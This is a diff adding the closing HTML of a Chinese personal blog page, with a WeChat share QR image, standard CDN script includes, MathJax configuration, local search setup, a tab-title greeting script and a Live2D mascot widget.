+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADK0lEQVR42u3ay47iQAwFUP7/p3ukWSGNCNd2ekSZk1VUBKhTG8ePxyO+fv5ez/fP16v150+vn7l+8nr932duu7CxsbEPYSdbSbaY4JMn588nx4qNjY29j50Erev7ewNPEpby38TGxsbGriYeeQjMQ1c1QGJjY2NjN1/xB8hJ8oONjY2NXS3uJOlHAqiGqF6LAhsbG3s3u9fo/cz7X+9vY2NjY38Y+6d19ZKKeQshD5Bv9o+NjY29iJ0PVlZTjv+zPjl6bGxs7B3sasN13rJNCvejMhA2Njb2V7KrKUGv8HS9kg9fJr/zRoSNjY29iD159c+3Uv1Wrw2QHzo2Njb2JnaylfxFPx+7yT+dDBVFjQFsbGzsw9l5SyB/vjot0ysSVRu95a1gY2NjH8JOCje9ok81nPT+sVkOw8bGxl7E7iUGeWGoVyRqxuGiCxsbG3sruzdMUx30+b1hoGYAw8bGxl7BzoPQ5MgmxaPe70SlJWxsbOwV7F6SkI/LJOuTcZzyYWFjY2MvYuetgl6qkKzkobTahL6hQ4KNjY39wexeyjFp3PbSm7xFcUM/BBsbG/tYdvXV/95UoTegUw292NjY2N/ArpZp8sA2v68e+sujwcbGxl7EnrdsJ+WheRmr2jCOeiPY2NjYR7F7SUIe/JKQNmk2JMnSm/YANjY29jp2EiryT5PtTopHzRCIjY2N/WXsOTVnJ/9S3W25loaNjY19FLs6XpMAemM91WJTtZD0cnAHGxsb+3B2b1vVTSSFp94hVhsSj+SMsbGxsY9lV5OKclG+mLpMQtebhgc2Njb2IvZdTdxJIzYfoMwHg/Ijw8bGxj6dPRm76RWJqslDLwl5c0zY2NjYi9jV+NZ8xR8kOXnzoLlnbGxs7MPZk3BVHdDpHURetMpTI2xsbOxN7Hn0u16fHEQvwajuExsbG3sHu1r6z0s8eXCqjv5Um8TRvBI2Njb24ewknPRW8mbAb5S0Xh4xNjY2NnYxqFyHlmr6MQpd2NjY2F/MvublwSZPRXrI6F+wsbGx17HzolISTnol/pw03z82Njb2Jnav0TsfmpkExbuODBsbG/tw9h9apMq+RjuVmAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '等你回来呀~';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)欢迎回来!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
